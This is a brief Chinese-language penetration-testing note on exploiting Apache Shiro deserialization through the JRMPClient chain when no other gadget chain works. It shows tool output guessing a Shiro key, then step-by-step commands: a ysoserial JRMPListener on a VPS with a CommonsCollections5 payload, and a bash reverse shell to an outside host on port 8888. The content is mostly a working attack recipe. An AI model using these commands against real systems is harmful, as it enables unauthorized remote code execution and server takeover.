## 0x00 漏洞背景

  在打一个项目中，shiro反序列化有个链容易忽略，找到key没有链，可以尝试JRMPClient，下面是shiro_tool.jar测试结果，关键部分不放了。
 ``` 
[-] target is use shiro
[-] start guess shiro key...
[-] use shiro key: 4AvVhmFLUs0KTA3Kprsdag==
[-] check CommonsBeanutils1
[-] check CommonsCollections1
[-] check CommonsCollections2
[-] check CommonsCollections3
[-] check CommonsCollections4
[-] check CommonsCollections5
[-] check CommonsCollections6
[-] check CommonsCollections7
[-] check Groovy1
[-] check JSON1
[-] check Spring1
[-] check Spring2
[-] check Jdk7u21
[-] check JRMPClient
[-] check ROME
[-] check Clojure
[*] find: JRMPClient can be use
0: JRMPClient
[-] please enter the number(0-0)

```
## 0x01 漏洞利用
  
  1.使用ysoserial.jar 工具搭建服务，VPS执行 java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 "ping rskzeg.dnslog.cn"
  
  2.shiro反序列利用工具中选择JRMPClient,然后输入VPS上搭建服务的地址
  
  3.执行反弹命令bash -i >& /dev/tcp/xxxxxx/8888 0>&1
  
